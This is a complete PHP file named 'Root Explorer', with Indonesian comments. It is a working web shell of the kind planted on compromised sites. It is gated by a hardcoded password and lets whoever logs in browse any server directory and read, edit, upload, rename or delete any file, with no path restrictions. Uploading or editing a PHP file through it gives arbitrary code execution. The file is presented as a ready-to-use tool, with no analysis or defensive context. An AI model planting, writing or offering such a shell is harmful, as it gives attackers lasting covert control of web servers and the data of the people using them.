<?php
session_start();
$password_admin = "Beelzebub"; 

// Logika Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Proses Login
$error_login = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $password_admin) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error_login = "Password salah!";
    }
}

// Cek Status Login, jika belum login tampilkan form login saja
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login - Root Explorer</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #262626; padding: 30px; border: 1px solid #00ff00; border-radius: 5px; width: 300px; text-align: center; box-shadow: 0 0 10px rgba(0,255,0,0.2); }
        input[type="password"] { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 90%; margin-bottom: 15px; text-align: center; }
        button { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; }
        button:hover { background: #00ff00; color: #000; }
        .error { color: #ff5555; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>[ ACCESS DENIED ]</h2>
        <p>Masukkan Password untuk Masuk</p>
        <?php if ($error_login): ?>
            <div class="error">> <?= htmlspecialchars($error_login) ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="password" name="login_password" placeholder="Password..." required autocomplete="off">
            <button type="submit">ENTER SYSTEM</button>
        </form>
    </div>
</body>
</html>
<?php
    exit; // Menghentikan eksekusi kode file manager di bawah jika belum login
}

// --- KODE UTAMA FILE MANAGER (Hanya berjalan jika sudah login) ---

// Ambil path dari URL, jika kosong gunakan direktori saat ini
$current_path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_path = str_replace(['\\', '//'], '/', $current_path);
$parent_path = dirname($current_path);
$message = "";

// Logika Action
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $target_name = $_POST['name'] ?? '';
    $old_name = $_POST['old_name'] ?? '';
    $content = $_POST['content'] ?? '';

    $full_target = $current_path . '/' . $target_name;
    $full_old = $current_path . '/' . $old_name;

    try {
        if ($action == 'new_folder' && !empty($target_name)) {
            mkdir($full_target);
        } elseif ($action == 'new_file' && !empty($target_name)) {
            file_put_contents($full_target, "");
        } elseif ($action == 'rename' && !empty($target_name) && !empty($old_name)) {
            rename($full_old, $full_target);
        } elseif ($action == 'delete' && !empty($target_name)) {
            is_dir($full_target) ? rmdir($full_target) : unlink($full_target);
        } elseif ($action == 'save_file' && !empty($target_name)) {
            file_put_contents($full_target, $content);
            $message = "File saved successfully!";
        } elseif ($action == 'upload' && isset($_FILES['file'])) {
            move_uploaded_file($_FILES['file']['tmp_name'], $current_path . '/' . $_FILES['file']['name']);
        }
    } catch (Exception $e) {
        $message = "Error: " . $e->getMessage();
    }
}

$items = @scandir($current_path) ?: [];
$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
$edit_content = "";
if ($edit_file) {
    $file_to_read = $current_path . '/' . $edit_file;
    if (is_file($file_to_read) && is_readable($file_to_read)) {
        $edit_content = file_get_contents($file_to_read);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Root Explorer PHP</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .container { background: #262626; padding: 20px; border: 1px solid #444; border-radius: 5px; }
        .breadcrumb { margin-bottom: 20px; padding: 10px; background: #333; border-radius: 4px; border-left: 5px solid #00ff00; display: flex; justify-content: space-between; align-items: center; }
        .breadcrumb a { color: #00ff00; text-decoration: none; font-weight: bold; }
        .breadcrumb a:hover { text-decoration: underline; }
        .toolbar { margin-bottom: 20px; padding: 15px; background: #333; border: 1px dashed #555; display: flex; gap: 10px; flex-wrap: wrap; }
        input, button, textarea { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 5px; }
        button { cursor: pointer; font-weight: bold; }
        button:hover { background: #00ff00; color: #000; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #444; }
        tr:hover { background: #333; }
        .btn-del { color: #ff5555; border-color: #ff5555; }
        .btn-del:hover { background: #ff5555; color: #000; }
        textarea { width: 100%; height: 400px; margin-top: 10px; font-family: 'Courier New'; }
        a { color: white; }
        .logout-btn { color: #ff5555 !important; text-decoration: none; font-weight: bold; border: 1px solid #ff5555; padding: 2px 8px; border-radius: 3px; }
        .logout-btn:hover { background: #ff5555; color: black !important; }
    </style>
</head>
<body>

<div class="container">
    <h2>[ Root System Explorer ]</h2>

    <div class="breadcrumb">
        <div>
            <strong>Location:</strong>
            <?php 
            $parts = explode('/', trim($current_path, '/'));
            $path_builder = (strpos(PHP_OS, 'WIN') === 0) ? "" : "/";
            
            echo "<a href='?dir=" . urlencode($path_builder) . "'>Root</a>";
            
            foreach ($parts as $part) {
                if ($part === '') continue;
                if (empty($path_builder) && strpos($part, ':') !== false) {
                    $path_builder = $part;
                } else {
                    $path_builder .= ($path_builder == "/" || empty($path_builder) ? "" : "/") . $part;
                }
                echo " / <a href='?dir=" . urlencode($path_builder) . "'>$part</a>";
            }
            ?>
        </div>
        <!-- Tombol Logout -->
        <a href="?action=logout" class="logout-btn">LOGOUT</a>
    </div>

    <?php if ($message): ?>
        <div style="color: yellow; margin-bottom: 15px;"> > <?= htmlspecialchars($message) ?></div>
    <?php endif; ?>

    <div class="toolbar">
        <form method="POST">
            <input type="text" name="name" placeholder="Name..." required>
            <button type="submit" name="action" value="new_folder">+ Folder</button>
            <button type="submit" name="action" value="new_file">+ File</button>
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="action" value="upload">Upload</button>
        </form>
    </div>

    <?php if ($edit_file): ?>
        <div style="margin-bottom: 20px;">
            <h3>Editing: <?= htmlspecialchars($edit_file) ?></h3>
            <form method="POST">
                <input type="hidden" name="name" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content"><?= htmlspecialchars($edit_content) ?></textarea>
                <div style="margin-top:10px">
                    <button type="submit" name="action" value="save_file">SAVE CHANGES</button>
                    <a href="?dir=<?= urlencode($current_path) ?>" style="color: #ff5555;">[ CANCEL ]</a>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td colspan="3"><a href="?dir=<?= urlencode($parent_path) ?>" style="color: yellow;">.. (Parent Directory)</a></td>
            </tr>

            <?php foreach ($items as $f): 
                if ($f == '.' || $f == '..') continue;
                $full_item_path = $current_path . '/' . $f;
                $is_folder = is_dir($full_item_path);
            ?>
            <tr>
                <td>
                    <?php if ($is_folder): ?>
                        <strong><a href="?dir=<?= urlencode($full_item_path) ?>">📁 <?= htmlspecialchars($f) ?>/</a></strong>
                    <?php else: ?>
                        📄 <?= htmlspecialchars($f) ?>
                    <?php endif; ?>
                </td>
                <td><small><?= $is_folder ? 'DIR' : 'FILE' ?></small></td>
                <td>
                    <div style="display:flex; gap:10px">
                        <form method="POST" style="display:inline">
                            <input type="hidden" name="old_name" value="<?= htmlspecialchars($f) ?>">
                            <input type="text" name="name" placeholder="Rename" style="width:80px">
                            <button type="submit" name="action" value="rename">Ren</button>
                        </form>

                        <?php if (!$is_folder): ?>
                            <a href="?dir=<?= urlencode($current_path) ?>&edit=<?= urlencode($f) ?>">[EDIT]</a>
                        <?php endif; ?>

                        <form method="POST" onsubmit="return confirm('Delete?')" style="display:inline">
                            <input type="hidden" name="name" value="<?= htmlspecialchars($f) ?>">
                            <button type="submit" name="action" value="delete" class="btn-del">DEL</button>
                        </form>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

</body>
</html>